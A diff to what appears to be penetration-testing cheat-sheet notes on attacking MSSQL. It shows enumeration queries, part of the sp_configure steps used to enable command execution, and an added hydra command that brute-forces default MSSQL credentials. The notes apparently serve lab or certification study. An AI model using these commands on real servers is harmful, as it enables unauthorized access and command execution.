@@ -12,7 +12,7 @@ For this port, you can find credentials from another port and log in with ipacke
 
     SELECT @@version; | SELECT name FROM sys.databases; | SELECT FROM offsec.information_schema.tables; | select from offsec.dbo.users;
 
-## Connect as CMD database
+### 1) Connect as CMD database
 
 
     SQL> EXECUTE sp_configure 'show advanced options', 1;
@@ -33,3 +33,6 @@ For this port, you can find credentials from another port and log in with ipacke
 
 also applied on SQL Injection login
 
+### 2) Brute force default MSSQL credentials
+
+    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt IP mssql
